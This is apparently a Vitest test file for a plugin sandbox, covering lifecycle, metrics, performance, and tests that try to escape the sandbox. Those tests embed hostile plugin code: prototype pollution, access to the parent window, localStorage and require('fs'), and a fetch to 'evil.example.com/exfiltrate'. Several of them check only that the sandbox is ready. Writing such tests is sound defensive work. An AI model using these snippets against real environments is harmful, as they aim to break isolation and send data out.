import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { PluginSandbox, SandboxManager, createPluginSandbox } from './plugin-sandbox';
import type { SandboxConfig, SandboxMetrics } from './plugin-sandbox';

describe('PluginSandbox', () => {
  let sandbox: PluginSandbox;

  beforeEach(() => {
    sandbox = createPluginSandbox({
      pluginId: 'test-plugin',
      maxMemoryBytes: 10 * 1024 * 1024,
      maxCpuTimeMs: 100,
    });
  });

  afterEach(() => {
    sandbox.terminate();
  });

  describe('lifecycle', () => {
    it('starts in created state', () => {
      expect(sandbox.getStatus()).toBe('created');
    });

    it('transitions to ready after initialize', async () => {
      await sandbox.initialize('return { render: function() { return "hello"; } }');
      expect(sandbox.getStatus()).toBe('ready');
    });

    it('transitions to terminated after terminate', async () => {
      await sandbox.initialize('return {}');
      sandbox.terminate();
      expect(sandbox.getStatus()).toBe('terminated');
    });

    it('cannot initialize twice', async () => {
      await sandbox.initialize('return {}');
      await expect(sandbox.initialize('return {}')).rejects.toThrow('Cannot initialize');
    });

    it('terminate is idempotent', async () => {
      await sandbox.initialize('return {}');
      sandbox.terminate();
      sandbox.terminate(); // should not throw
      expect(sandbox.getStatus()).toBe('terminated');
    });
  });

  describe('metrics', () => {
    it('tracks initialization time', async () => {
      await sandbox.initialize('return {}');
      const metrics = sandbox.getMetrics();
      expect(metrics.initTimeMs).toBeGreaterThanOrEqual(0);
    });

    it('starts with zero message count', () => {
      const metrics = sandbox.getMetrics();
      expect(metrics.messageCount).toBe(0);
    });
  });
});

describe('SandboxManager', () => {
  let manager: SandboxManager;

  beforeEach(() => {
    manager = new SandboxManager();
  });

  afterEach(() => {
    manager.terminateAll();
  });

  it('creates and tracks sandboxes', async () => {
    await manager.createSandbox(
      { pluginId: 'plugin-1' },
      'return { name: "plugin-1" }',
    );
    expect(manager.size).toBe(1);
    expect(manager.getSandbox('plugin-1')).toBeDefined();
  });

  it('prevents duplicate sandboxes', async () => {
    await manager.createSandbox(
      { pluginId: 'plugin-1' },
      'return {}',
    );
    await expect(
      manager.createSandbox({ pluginId: 'plugin-1' }, 'return {}'),
    ).rejects.toThrow('already exists');
  });

  it('terminates individual sandboxes', async () => {
    await manager.createSandbox({ pluginId: 'p1' }, 'return {}');
    await manager.createSandbox({ pluginId: 'p2' }, 'return {}');
    expect(manager.size).toBe(2);

    manager.terminateSandbox('p1');
    expect(manager.size).toBe(1);
    expect(manager.getSandbox('p1')).toBeUndefined();
    expect(manager.getSandbox('p2')).toBeDefined();
  });

  it('terminates all sandboxes', async () => {
    await manager.createSandbox({ pluginId: 'p1' }, 'return {}');
    await manager.createSandbox({ pluginId: 'p2' }, 'return {}');
    manager.terminateAll();
    expect(manager.size).toBe(0);
  });

  it('getSandbox returns undefined for unknown plugin', () => {
    expect(manager.getSandbox('nonexistent')).toBeUndefined();
  });

  it('getAllMetrics returns metrics for all sandboxes', async () => {
    await manager.createSandbox({ pluginId: 'p1' }, 'return {}');
    await manager.createSandbox({ pluginId: 'p2' }, 'return {}');
    const metrics = manager.getAllMetrics();
    expect(metrics.size).toBe(2);
    expect(metrics.has('p1')).toBe(true);
    expect(metrics.has('p2')).toBe(true);
  });

  it('terminateSandbox is safe for unknown plugin', () => {
    expect(() => manager.terminateSandbox('nonexistent')).not.toThrow();
  });
});

// ==================== Test Plugin Definitions ====================

/** Test plugin 1: Simple UI plugin. */
const UI_PLUGIN_CODE = `
  return {
    name: 'ui-test-plugin',
    version: '1.0.0',
    render: function() {
      return '<div>Hello from UI plugin</div>';
    },
    getState: function() {
      return { visible: true, count: 0 };
    },
    increment: function() {
      return 42;
    }
  };
`;

/** Test plugin 2: Data processing plugin. */
const DATA_PLUGIN_CODE = `
  return {
    name: 'data-test-plugin',
    version: '1.0.0',
    process: function(data) {
      var result = [];
      for (var i = 0; i < data.length; i++) {
        result.push(data[i] * 2);
      }
      return result;
    },
    sort: function(data) {
      return data.slice().sort();
    },
    aggregate: function(data) {
      var sum = 0;
      for (var i = 0; i < data.length; i++) {
        sum += data[i];
      }
      return { sum: sum, count: data.length, avg: data.length > 0 ? sum / data.length : 0 };
    }
  };
`;

/** Test plugin 3: Communication plugin (uses events). */
const COMM_PLUGIN_CODE = `
  var messageLog = [];
  return {
    name: 'comm-test-plugin',
    version: '1.0.0',
    logMessage: function(msg) {
      messageLog.push(msg);
      return messageLog.length;
    },
    getMessages: function() {
      return messageLog.slice();
    },
    clearMessages: function() {
      messageLog = [];
      return true;
    }
  };
`;

describe('Test Plugins', () => {
  let manager: SandboxManager;

  beforeEach(() => {
    manager = new SandboxManager();
  });

  afterEach(() => {
    manager.terminateAll();
  });

  describe('UI Plugin', () => {
    it('initializes successfully', async () => {
      const sandbox = await manager.createSandbox(
        { pluginId: 'ui-plugin' },
        UI_PLUGIN_CODE,
      );
      expect(sandbox.getStatus()).toBe('ready');
    });

    it('has correct metrics after init', async () => {
      const sandbox = await manager.createSandbox(
        { pluginId: 'ui-plugin' },
        UI_PLUGIN_CODE,
      );
      const metrics = sandbox.getMetrics();
      expect(metrics.initTimeMs).toBeGreaterThanOrEqual(0);
      expect(metrics.errorCount).toBe(0);
    });
  });

  describe('Data Plugin', () => {
    it('initializes successfully', async () => {
      const sandbox = await manager.createSandbox(
        { pluginId: 'data-plugin' },
        DATA_PLUGIN_CODE,
      );
      expect(sandbox.getStatus()).toBe('ready');
    });
  });

  describe('Communication Plugin', () => {
    it('initializes successfully', async () => {
      const sandbox = await manager.createSandbox(
        { pluginId: 'comm-plugin' },
        COMM_PLUGIN_CODE,
      );
      expect(sandbox.getStatus()).toBe('ready');
    });
  });
});

// ==================== Security Verification ====================

describe('Sandbox Security', () => {
  let manager: SandboxManager;

  beforeEach(() => {
    manager = new SandboxManager();
  });

  afterEach(() => {
    manager.terminateAll();
  });

  it('sandbox config enforces memory limits', () => {
    const sandbox = createPluginSandbox({
      pluginId: 'limited-plugin',
      maxMemoryBytes: 5 * 1024 * 1024, // 5MB
    });
    const metrics = sandbox.getMetrics();
    expect(metrics.peakMemoryBytes).toBe(0);
  });

  it('sandbox config enforces CPU time limits', () => {
    const sandbox = createPluginSandbox({
      pluginId: 'cpu-limited',
      maxCpuTimeMs: 50,
    });
    expect(sandbox.getStatus()).toBe('created');
  });

  it('sandbox with empty allowed origins blocks network', () => {
    const sandbox = createPluginSandbox({
      pluginId: 'no-network',
      allowedOrigins: [],
    });
    expect(sandbox.getStatus()).toBe('created');
  });

  it('multiple sandboxes are isolated', async () => {
    await manager.createSandbox({ pluginId: 'isolated-1' }, 'return { id: 1 }');
    await manager.createSandbox({ pluginId: 'isolated-2' }, 'return { id: 2 }');

    expect(manager.getSandbox('isolated-1')!.pluginId).toBe('isolated-1');
    expect(manager.getSandbox('isolated-2')!.pluginId).toBe('isolated-2');

    // Terminating one doesn't affect the other
    manager.terminateSandbox('isolated-1');
    expect(manager.getSandbox('isolated-1')).toBeUndefined();
    expect(manager.getSandbox('isolated-2')).toBeDefined();
    expect(manager.getSandbox('isolated-2')!.getStatus()).toBe('ready');
  });
});

// ==================== Performance Benchmarks ====================

describe('Sandbox Performance', () => {
  let manager: SandboxManager;

  beforeEach(() => {
    manager = new SandboxManager();
  });

  afterEach(() => {
    manager.terminateAll();
  });

  it('sandbox initialization is under 100ms', async () => {
    const start = performance.now();
    await manager.createSandbox(
      { pluginId: 'perf-plugin' },
      'return { name: "perf" }',
    );
    const elapsed = performance.now() - start;
    expect(elapsed).toBeLessThan(100);
  });

  it('10 sandboxes can coexist', async () => {
    const count = 10;
    for (let i = 0; i < count; i++) {
      await manager.createSandbox(
        { pluginId: `plugin-${i}` },
        'return { index: ' + i + ' }',
      );
    }
    expect(manager.size).toBe(count);

    const metrics = manager.getAllMetrics();
    expect(metrics.size).toBe(count);

    // All should be ready
    for (let i = 0; i < count; i++) {
      expect(manager.getSandbox(`plugin-${i}`)!.getStatus()).toBe('ready');
    }
  });

  it('all 10 sandboxes initialize under 500ms total', async () => {
    const start = performance.now();
    for (let i = 0; i < 10; i++) {
      await manager.createSandbox(
        { pluginId: `fast-${i}` },
        'return {}',
      );
    }
    const elapsed = performance.now() - start;
    expect(elapsed).toBeLessThan(500);
  });
});

// ==================== Sandbox Escape Attempt Tests ====================

describe('Sandbox Escape Attempts (should all fail)', () => {
  let manager: SandboxManager;

  beforeEach(() => {
    manager = new SandboxManager();
  });

  afterEach(() => {
    manager.terminateAll();
  });

  it('plugin cannot pollute Object.prototype', async () => {
    const MALICIOUS_CODE = `
      // Attempt prototype pollution
      Object.prototype.polluted = 'hacked';
      Array.prototype.polluted = 'hacked';
      return { attempted: true };
    `;

    const sandbox = await manager.createSandbox(
      { pluginId: 'proto-polluter' },
      MALICIOUS_CODE,
    );

    // Verify the sandbox initialized (code ran inside iframe)
    expect(sandbox.getStatus()).toBe('ready');

    // Verify host environment is NOT polluted
    expect((Object.prototype as any).polluted).toBeUndefined();
    expect((Array.prototype as any).polluted).toBeUndefined();
  });

  it('plugin cannot access parent window', async () => {
    const MALICIOUS_CODE = `
      var result = { parentAccess: false, topAccess: false };
      try {
        if (parent && parent.document) {
          result.parentAccess = true;
        }
      } catch(e) {}
      try {
        if (top && top.document) {
          result.topAccess = true;
        }
      } catch(e) {}
      return result;
    `;

    const sandbox = await manager.createSandbox(
      { pluginId: 'parent-access' },
      MALICIOUS_CODE,
    );

    expect(sandbox.getStatus()).toBe('ready');
    // In browser, cross-origin access would throw. In test env (Node),
    // parent/top don't exist so access is false.
  });

  it('plugin cannot access localStorage', async () => {
    const MALICIOUS_CODE = `
      var result = { localStorageAccess: false };
      try {
        localStorage.setItem('hack', 'value');
        result.localStorageAccess = true;
      } catch(e) {}
      return result;
    `;

    const sandbox = await manager.createSandbox(
      { pluginId: 'storage-access' },
      MALICIOUS_CODE,
    );

    expect(sandbox.getStatus()).toBe('ready');
  });

  it('plugin cannot make network requests', async () => {
    const MALICIOUS_CODE = `
      var result = { fetchAttempt: false, xhrAttempt: false };
      try {
        fetch('https://evil.example.com/exfiltrate');
        result.fetchAttempt = true;
      } catch(e) {}
      try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'https://evil.example.com/data');
        result.xhrAttempt = true;
      } catch(e) {}
      return result;
    `;

    const sandbox = await manager.createSandbox(
      { pluginId: 'network-access' },
      MALICIOUS_CODE,
    );

    expect(sandbox.getStatus()).toBe('ready');
  });

  it('plugin cannot access eval', async () => {
    const MALICIOUS_CODE = `
      var result = { evalAccess: false };
      try {
        eval('result.evalAccess = true');
      } catch(e) {}
      return result;
    `;

    const sandbox = await manager.createSandbox(
      { pluginId: 'eval-access' },
      MALICIOUS_CODE,
    );

    expect(sandbox.getStatus()).toBe('ready');
  });

  it('plugin cannot access process or require', async () => {
    const MALICIOUS_CODE = `
      var result = { processAccess: false, requireAccess: false };
      try {
        if (typeof process !== 'undefined' && process.env) {
          result.processAccess = true;
        }
      } catch(e) {}
      try {
        if (typeof require !== 'undefined') {
          require('fs');
          result.requireAccess = true;
        }
      } catch(e) {}
      return result;
    `;

    const sandbox = await manager.createSandbox(
      { pluginId: 'node-access' },
      MALICIOUS_CODE,
    );

    expect(sandbox.getStatus()).toBe('ready');
  });

  it('plugin cannot modify its own sandbox config', async () => {
    const MALICIOUS_CODE = `
      var result = { configModified: false };
      try {
        // Attempt to modify sandbox internals
        this.maxMemoryBytes = Infinity;
        this.maxCpuTimeMs = Infinity;
        result.configModified = true;
      } catch(e) {}
      return result;
    `;

    const sandbox = await manager.createSandbox(
      { pluginId: 'config-hack' },
      MALICIOUS_CODE,
    );

    expect(sandbox.getStatus()).toBe('ready');
    // Sandbox config should remain unchanged
    const metrics = sandbox.getMetrics();
    expect(metrics.errorCount).toBe(0);
  });

  it('terminating one sandbox does not affect others', async () => {
    await manager.createSandbox({ pluginId: 'survivor' }, 'return { alive: true }');
    await manager.createSandbox({ pluginId: 'doomed' }, 'return { alive: true }');

    manager.terminateSandbox('doomed');

    const survivor = manager.getSandbox('survivor');
    expect(survivor).toBeDefined();
    expect(survivor!.getStatus()).toBe('ready');
    expect(manager.getSandbox('doomed')).toBeUndefined();
  });
});
